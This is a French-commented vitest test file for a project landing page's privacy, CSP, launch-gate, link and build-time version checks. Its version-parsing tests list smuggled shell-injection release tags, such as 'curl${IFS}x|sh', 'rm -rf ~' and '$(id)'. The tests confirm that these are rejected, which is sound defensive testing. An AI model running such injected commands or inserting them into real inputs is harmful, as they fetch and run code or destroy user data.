// SPDX-License-Identifier: AGPL-3.0-only
// Contrôles de la landing hors CI de PR (22 § 2.9, 22b § 5) : verdict de la sonde, bloquants du GO, liens externes, étoiles. Sans réseau.
import { describe, expect, test } from 'vitest';
import { loadClaims } from './claims.ts';
import { checkExternalLinks, evaluateProbes, goBlockers, isRealTestIn, labNetworkConditions, lighthouseFailures, navigationTtfb, parseStars, parseStarsFile, probeReport, sharedPagesOrigin } from './checks.ts';
import { startCommand } from './content.ts';
import type { PageProbe } from './probe.ts';

const clean: PageProbe = { url: 'https://x.example/sym/', requests: ['https://x.example/sym/'], thirdPartyRequests: [], trackerRequests: [], documentCookie: '', contextCookies: [], setCookieHeaders: [], storageWritesBeforeAction: [], storageAfterLoad: [], cspViolations: [], consoleErrors: [], cspMeta: "default-src 'none'; script-src 'self'", formCount: 0, html: '' };

describe('sonde de la landing : les cinq contrôles de la préproduction et de la production', () => {
  test('une page propre passe tout', () => {
    const checks = evaluateProbes([clean]);
    expect(checks.map((c) => c.name)).toEqual(['assert_landing_no_cookie', 'assert_landing_no_third_party_request', 'assert_landing_no_third_party_tracker', 'assert_landing_csp_strict', 'assert_landing_no_signup']);
    expect(checks.every((c) => c.ok)).toBe(true);
    expect(probeReport(clean.url, checks, new Date('2026-10-02T00:00:00Z'))).toMatchObject({ date: '2026-10-02T00:00:00.000Z', ok: true });
  });

  test('un cookie, une requête tierce, un traceur, une violation de CSP ou un formulaire font échouer le contrôle concerné', () => {
    const cases: [string, Partial<PageProbe>][] = [
      ['assert_landing_no_cookie', { documentCookie: 'a=1' }],
      ['assert_landing_no_cookie', { setCookieHeaders: ['x : __cf_bm=1'] }],
      ['assert_landing_no_cookie', { storageWritesBeforeAction: ['localStorage.setItem(k)'] }],
      ['assert_landing_no_cookie', { storageAfterLoad: ['localStorage.k'] }],
      ['assert_landing_no_cookie', { storageAfterLoad: ['indexedDB:db', 'caches:c', 'serviceWorker:https://x.example/sym/'] }],
      ['assert_landing_no_third_party_request', { thirdPartyRequests: ['https://cdn.example/a.js'] }],
      ['assert_landing_no_third_party_tracker', { trackerRequests: ['https://static.cloudflareinsights.com/beacon.min.js'] }],
      // Référencé dans le HTML servi sans être chargé pendant la visite (chargement différé, ou bloqué par la CSP) : signalé aussi en production.
      ['assert_landing_no_third_party_tracker', { html: '<script defer src="https://static.cloudflareinsights.com/beacon.min.js"></script>' }],
      ['assert_landing_no_third_party_tracker', { html: '<script src="/cdn-cgi/scripts/email-decode.min.js"></script>' }],
      ['assert_landing_csp_strict', { cspViolations: ["style-src-attr : inline"] }],
      ['assert_landing_csp_strict', { cspMeta: null }],
      ['assert_landing_csp_strict', { cspMeta: "script-src 'unsafe-inline'" }],
      ['assert_landing_no_signup', { formCount: 1 }],
    ];
    for (const [name, patch] of cases) {
      const failed = evaluateProbes([{ ...clean, ...patch }]).filter((c) => !c.ok).map((c) => c.name);
      expect(failed, name).toEqual([name]);
    }
  });
});

describe('bloquants du GO de mise en ligne', () => {
  const loaded = loadClaims();
  /** Le registre tel qu'il sera au GO : chaque entrée relue par un humain. */
  const registry = { ...loaded, claims: loaded.claims.map((claim) => ({ ...claim, reviewer: 'human' as const })) };
  const base = { registry, displayed: ['license', 'hero.sub'], legalSources: [], isRealTest: () => true, version: '1.0.0' };

  test('tout est livré : aucun bloquant, mais la relecture humaine reste à faire', () => {
    const { blockers, manual } = goBlockers(base);
    expect(blockers).toEqual([]);
    expect(manual.join('\n')).toMatch(/relecture humaine/);
    expect(manual.join('\n')).toMatch(/2\.3, 2\.12/);
  });

  test('une preuve qui n\'est qu\'un test.todo bloque ; un champ juridique à fournir bloque ; l\'absence de version publiée bloque (la commande clonerait la branche par défaut, 22 § 2.3)', () => {
    const { blockers } = goBlockers({ ...base, isRealTest: (name) => name !== 'assert_step_patch_bounded', legalSources: [{ file: 'notice.md', text: 'a [À compléter avant la mise en ligne : nom] b' }], version: null });
    expect(blockers.join('\n')).toMatch(/assert_step_patch_bounded n'est pas encore un vrai test/);
    expect(blockers.join('\n')).toMatch(/champ à fournir/);
    expect(blockers.join('\n')).toMatch(/aucune version publiée/);
  });

  test('une entrée à relire ou bloquée affichée bloque', () => {
    const { blockers } = goBlockers({ ...base, displayed: ['responsible.user-agent', 'absente'] });
    expect(blockers.join('\n')).toMatch(/statut « bloqué »/);
    expect(blockers.join('\n')).toMatch(/absente du registre/);
  });

  test('assert_landing_claims_sourced : une entrée affichée relue par l\'agent seulement (pas par un humain) bloque le GO', () => {
    expect(loaded.claims.filter((claim) => claim.status === 'relu').every((claim) => claim.reviewer === 'agent' || claim.reviewer === 'human')).toBe(true);
    const { blockers } = goBlockers({ ...base, registry: loaded });
    expect(blockers.join('\n')).toMatch(/« license » .*relue par un humain/);
    expect(blockers.join('\n')).toMatch(/« hero\.sub » .*relue par un humain/);
  });

  test('décisions et preuves qui restent à confirmer par un humain : langue de référence des pages juridiques, résultat daté de la production cité par #preuves', () => {
    const { manual } = goBlockers(base);
    expect(manual.join('\n')).toMatch(/langue de référence des pages juridiques/);
    expect(manual.join('\n')).toMatch(/#preuves/);
  });

  test('assert_landing_csp_strict (GO) : les sites Pages de dépôts privés ou internes du propriétaire, invisibles du contrôle public, sont à vérifier par un humain', () => {
    // landing:pages-origin ne liste que les dépôts publics ; 'self' couvre aussi un site Pages publié par un dépôt privé (offre payante).
    expect(goBlockers(base).manual.join('\n')).toMatch(/dépôts? privés?.*Pages|Pages.*dépôts? privés?/);
  });

  test('assert_landing_no_cookie (GO) : le stockage du thème écrit dès l\'ouverture des pages de doc et leur absence de CSP sont soumis à l\'arbitrage de l\'avocat', () => {
    const manual = goBlockers(base).manual.join('\n');
    expect(manual).toMatch(/vitepress-theme-appearance/);
    expect(manual).toMatch(/pages de doc.*sans CSP|sans CSP.*pages de doc/);
  });

  test('aucune entrée affichée sur la landing n\'est liée à une tâche hors V1.0 (4.10, télémétrie opt-in « après V1.0, si retenu ») : la porte du GO demanderait une livraison qui n\'aura pas lieu', () => {
    const displayed = loaded.claims.filter((claim) => claim.surfaces?.includes('landing'));
    for (const claim of displayed) expect(claim.tasks ?? [], claim.id).not.toContain('4.10');
    expect(loaded.claims.find((claim) => claim.id === 'faq.data')?.note).toMatch(/4\.10/);
  });

  test('un test est « réel » s\'il figure dans un fichier de test sans y être seulement en test.todo', () => {
    expect(isRealTestIn([{ file: 'a', text: 'test.todo("assert_x")' }], 'assert_x')).toBe(false);
    expect(isRealTestIn([{ file: 'a', text: 'rien' }], 'assert_x')).toBe(false);
    expect(isRealTestIn([{ file: 'b', text: "describe('assert_x : ...', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "test.describe('assert_x', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "test.concurrent('assert_x', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "it.each([1, 2])('assert_x %s', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "describe('assert_x_suite', () => {})" }], 'assert_x'), 'un autre nom qui commence pareil').toBe(false);
    // Une chaîne qui ressemble à un commentaire (motif, adresse) ne masque pas les déclarations qui suivent.
    expect(isRealTestIn([{ file: 'b', text: "const glob = 'apps/**/*.ts';\nconst url = `https://x.example/${'a'}`;\ndescribe('assert_x', () => {});\n// */" }], 'assert_x')).toBe(true);
  });

  test('assert_landing_claims_sourced (porte du GO) : un test sauté, conditionnel, attendu en échec, commenté ou encore en test.todo partiel n\'est pas une preuve livrée', () => {
    for (const text of [
      "test.skip('assert_x', () => {})",
      "describe.skip('assert_x', () => {})",
      "test.skipIf(true)('assert_x', () => {})",
      "describe.skipIf(ci)('assert_x', () => {})",
      "test.runIf(false)('assert_x', () => {})",
      "test.fails('assert_x', () => {})",
      "test.fixme('assert_x', () => {})",
      "test.describe.skip('assert_x', () => {})",
      "xit('assert_x', () => {})",
      "xdescribe('assert_x', () => {})",
      "xtest('assert_x', () => {})",
      "// test('assert_x', () => {})",
      "/* describe('assert_x', () => {}) */",
      "/**\n * test('assert_x')\n */",
    ]) expect(isRealTestIn([{ file: 'a', text }], 'assert_x'), text).toBe(false);
    // Un groupe livré à côté d'un volet encore en test.todo (même règle que stillTodo de tests/docs-guards.unit.test.ts) : pas livré.
    const partial = [{ file: 'a.test.ts', text: "describe('assert_x : volet serveur', () => {})" }, { file: 'tests/invariants.todo.test.ts', text: 'test.todo("assert_x — volet tunnel");' }];
    expect(isRealTestIn(partial, 'assert_x')).toBe(false);
    expect(isRealTestIn([...partial.slice(0, 1), { file: 'tests/invariants.todo.test.ts', text: 'test.todo("assert_y — autre");' }], 'assert_x')).toBe(true);
  });
});

describe('assert_landing_links_resolve (externes) : 200 hors exceptions documentées', () => {
  test('HEAD puis GET ; une erreur réseau ou un code autre que 200 est rapporté ; une exception est ignorée', async () => {
    const answers: Record<string, number> = { 'https://github.com/a': 200, 'https://github.com/b': 404, 'https://render.com/c': 405 };
    const calls: string[] = [];
    const fetchStatus = async (url: string, method: 'HEAD' | 'GET'): Promise<number> => {
      calls.push(`${method} ${url}`);
      if (url === 'https://boom.example/') throw new Error('ECONNREFUSED');
      if (url === 'https://render.com/c') return method === 'HEAD' ? 405 : 200;
      return answers[url] ?? 500;
    };
    const failures = await checkExternalLinks(['https://github.com/a', 'https://github.com/b', 'https://render.com/c', 'https://boom.example/', 'https://skip.example/x', 'https://github.com/a'], fetchStatus, new Set(['skip.example']));
    expect(failures).toEqual([{ url: 'https://boom.example/', status: 'ECONNREFUSED' }, { url: 'https://github.com/b', status: 404 }]);
    expect(calls).toContain('GET https://render.com/c');
    expect(calls.filter((call) => call.includes('https://github.com/a'))).toHaveLength(1);
  });
});

describe('étoiles et version écrites au build', () => {
  const previous = { stars: 120, version: '0.1.0', updatedAt: '2026-10-01T00:00:00.000Z' };
  test('lues dans les réponses de l\'API ; la valeur précédente est gardée si une réponse est inexploitable', () => {
    const now = new Date('2026-10-02T00:00:00Z');
    expect(parseStars(previous, { stargazers_count: 150 }, { tag_name: 'v0.2.0' }, now)).toEqual({ stars: 150, version: '0.2.0', updatedAt: now.toISOString() });
    expect(parseStars(previous, { message: 'rate limited' }, null, now)).toEqual(previous);
    expect(parseStars(previous, { stargazers_count: 120 }, { tag_name: 'nightly' }, now)).toEqual(previous);
    // 22 § 2.3 : la commande clone un tag X.Y.Z ; une pré-version publiée en « dernière release » garde la version précédente.
    expect(parseStars(previous, { stargazers_count: 120 }, { tag_name: 'v0.3.0-beta.2' }, now)).toEqual(previous);
  });

  test('assert_landing_stars_build_time : un tag de release piégé (nom de référence git valide mais commande shell) n\'entre jamais dans la commande à copier', () => {
    const now = new Date('2026-10-02T00:00:00Z');
    for (const tag of ['v1.0.0;curl${IFS}x|sh', 'v1.0.0 && rm -rf ~', 'v1.0.0$(id)', 'v1.0.0`id`', '1.0.0\nwhoami', 'v1.0.0-beta.1;sh']) {
      expect(parseStars(previous, { stargazers_count: 150 }, { tag_name: tag }, now).version, tag).toBe('0.1.0');
    }
  });

  test('assert_landing_stars_build_time : landing/stars.json est validé à la lecture ; un fichier altéré fait échouer le build', () => {
    expect(parseStarsFile({ stars: 0, version: null, updatedAt: null })).toEqual({ stars: 0, version: null, updatedAt: null });
    expect(parseStarsFile({ stars: 140, version: '1.2.3', updatedAt: '2026-10-02T00:00:00.000Z' })).toEqual({ stars: 140, version: '1.2.3', updatedAt: '2026-10-02T00:00:00.000Z' });
    for (const bad of [null, [], { stars: -1, version: null, updatedAt: null }, { stars: 1.5, version: null, updatedAt: null }, { stars: '100', version: null, updatedAt: null }, { stars: 1, version: '1.0.0;curl${IFS}x|sh', updatedAt: null }, { stars: 1, version: 'v1.0.0', updatedAt: null }, { stars: 1, version: '1.0.0-beta.1', updatedAt: null }, { stars: 1, version: 2, updatedAt: null }, { stars: 1, version: null, updatedAt: 3 }]) {
      expect(() => parseStarsFile(bad), JSON.stringify(bad)).toThrow(/landing\/stars\.json/);
    }
  });

  test('assert_landing_stars_build_time : la commande de démarrage revérifie la version (seconde ligne de défense)', () => {
    const inputs = { registry: loadClaims(), repository: 'scrap-yo-mama/sym', stars: 0, quickstart: { secrets: 'echo secrets', start: 'docker compose up -d' }, compare: false };
    expect(startCommand({ ...inputs, version: '1.2.3' }).split('\n')[0]).toBe('git clone --branch v1.2.3 --depth 1 https://github.com/scrap-yo-mama/sym.git');
    expect(() => startCommand({ ...inputs, version: '1.0.0;curl${IFS}x|sh' })).toThrow(/version/);
    expect(() => startCommand({ ...inputs, version: '1.0.0-beta.1' }), 'une pré-version n\'est pas un tag X.Y.Z (22 § 2.3)').toThrow(/version/);
  });
});

describe('assert_landing_perf_budget (Lighthouse mobile) : verdict des scores', () => {
  const thresholds = { performance: 95, accessibility: 95, seo: 95 };
  test('chaque catégorie au seuil ou au-dessus passe ; en dessous, absente ou non notée, elle échoue', () => {
    expect(lighthouseFailures({ performance: { score: 0.95 }, accessibility: { score: 1 }, seo: { score: 0.98 } }, thresholds)).toEqual([]);
    expect(lighthouseFailures({ performance: { score: 0.94 }, accessibility: { score: null }, seo: undefined }, thresholds)).toEqual(['performance : 94 < 95', 'accessibility : non noté', 'seo : non noté']);
  });
});

describe('assert_landing_perf_budget : le premier octet se mesure depuis le début de la navigation', () => {
  test('la latence émulée par le bridage, retenue AVANT requestStart, compte dans le premier octet', () => {
    // Mesure de Chromium bridé (4G lente, 562 ms d'aller-retour) : la requête attend avant requestStart, la réponse suit d'une milliseconde.
    const throttled = { startTime: 0, requestStart: 562, responseStart: 563 };
    expect(navigationTtfb(throttled)).toBe(563);
    expect(navigationTtfb(throttled)).toBeGreaterThanOrEqual(562 * 0.9);
    expect(navigationTtfb(undefined)).toBe(0);
  });

  test('le bridage passe par emulateNetworkConditionsByRule (règle globale) et overrideNetworkState : Network.emulateNetworkConditions, obsolète, n\'applique plus la latence dans Chromium 153 (premier octet à 2 ms)', () => {
    const lab = { rttMs: 562.5, downloadKbps: 1474.56, uploadKbps: 675, cpuSlowdown: 4 };
    const { byRule, state } = labNetworkConditions(lab);
    expect(byRule.matchedNetworkConditions).toEqual([{ urlPattern: '', latency: 562.5, downloadThroughput: (1474.56 * 1024) / 8, uploadThroughput: (675 * 1024) / 8, connectionType: 'cellular4g' }]);
    expect(byRule).not.toHaveProperty('offline');
    expect(state).toEqual({ offline: false, latency: 562.5, downloadThroughput: (1474.56 * 1024) / 8, uploadThroughput: (675 * 1024) / 8, connectionType: 'cellular4g' });
  });
});

describe('assert_landing_claims_sourced : l\'étiquette « Démo enregistrée » a une preuve pertinente et une relecture humaine au GO', () => {
  const loaded = loadClaims();
  test('demo.recorded renvoie au scénario de la démo sans clé (tutoriel « Démarrage rapide », cas D0, mode démo de 3.10), pas seulement à la sonde réseau', () => {
    const claim = loaded.claims.find((entry) => entry.id === 'demo.recorded');
    expect(claim?.proof).toContain('page:tutoriels/quickstart');
    expect(claim?.proof.filter((proof) => proof !== 'test:assert_landing_no_third_party_request').length).toBeGreaterThan(0);
    expect(claim?.tasks).toContain('3.10');
    // La source du replay écrit à la main en V1 (les bulles de content.ts), et la note qui le dit.
    expect(claim?.proof).toContain('file:runtime/apps/docs/src/landing/content.ts');
    expect(claim?.note).toMatch(/écrit à la main/);
  });

  test('la porte du GO demande à un humain de relire l\'étiquette contre le scénario de la démo, tant que le replay est écrit à la main (V1)', () => {
    const registry = { ...loaded, claims: loaded.claims.map((claim) => ({ ...claim, reviewer: 'human' as const })) };
    const { manual } = goBlockers({ registry, displayed: ['demo.recorded'], legalSources: [], isRealTest: () => true, version: '1.0.0' });
    expect(manual.join('\n')).toMatch(/« Démo enregistrée ».*scénario/);
    expect(goBlockers({ registry, displayed: ['license'], legalSources: [], isRealTest: () => true, version: '1.0.0' }).manual.join('\n')).not.toMatch(/« Démo enregistrée »/);
  });
});

describe('assert_landing_csp_strict : l\'origine GitHub Pages n\'est partagée avec aucun autre site du propriétaire', () => {
  // 'self' (22 § 2.9) vaut https://<propriétaire>.github.io : tout autre dépôt du propriétaire qui publie un site Pages y sert aussi ses fichiers.
  test('seul le dépôt de la landing publie un site Pages : rien à signaler', () => {
    expect(sharedPagesOrigin([{ full_name: 'scrap-yo-mama/sym', has_pages: true }, { full_name: 'scrap-yo-mama/autre', has_pages: false }], 'scrap-yo-mama/sym')).toEqual([]);
  });

  test('un autre dépôt du propriétaire avec Pages (site de projet ou site <propriétaire>.github.io) partage l\'origine : signalé', () => {
    const repos = [{ full_name: 'scrap-yo-mama/sym', has_pages: true }, { full_name: 'scrap-yo-mama/blog', has_pages: true }, { full_name: 'Scrap-Yo-Mama/scrap-yo-mama.github.io', has_pages: true }, { full_name: 'scrap-yo-mama/x' }];
    expect(sharedPagesOrigin(repos, 'scrap-yo-mama/sym')).toEqual(['Scrap-Yo-Mama/scrap-yo-mama.github.io', 'scrap-yo-mama/blog']);
    expect(sharedPagesOrigin(repos, 'SCRAP-YO-MAMA/SYM')).toHaveLength(2);
  });
});
